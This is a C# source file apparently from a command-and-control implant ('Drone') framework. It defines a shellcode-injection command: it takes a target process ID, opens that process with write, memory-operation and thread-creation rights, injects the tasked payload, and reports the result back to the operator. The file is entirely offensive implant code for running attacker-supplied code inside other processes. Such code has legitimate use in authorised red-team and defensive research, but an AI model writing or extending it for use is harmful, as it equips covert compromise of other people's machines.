using System;
using System.Threading;
using System.Threading.Tasks;

using Drone.Models;
using Drone.Utilities;

namespace Drone.Commands;

public sealed class ShInject : DroneCommand
{
    public override byte Command => 0x17;
    
    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        var pid = int.Parse(task.Arguments[0]);

        var hProcess = Native.NtOpenProcess((uint) pid,
            (uint) (Win32.PROCESS_ACCESS_FLAGS.PROCESS_VM_WRITE | Win32.PROCESS_ACCESS_FLAGS.PROCESS_VM_OPERATION |
                    Win32.PROCESS_ACCESS_FLAGS.PROCESS_CREATE_THREAD));

        if (hProcess == IntPtr.Zero)
        {
            await Drone.SendError(task, "Failed to get handle to process.");
            return;
        }

        var injector = new Injector(task.Artefact);

        if (injector.Inject(hProcess))
        {
            await Drone.SendTaskComplete(task);
        }
        else
        {
            await Drone.SendError(task, "Failed.");
        }
        
        Win32.CloseHandle(hProcess);
    }
}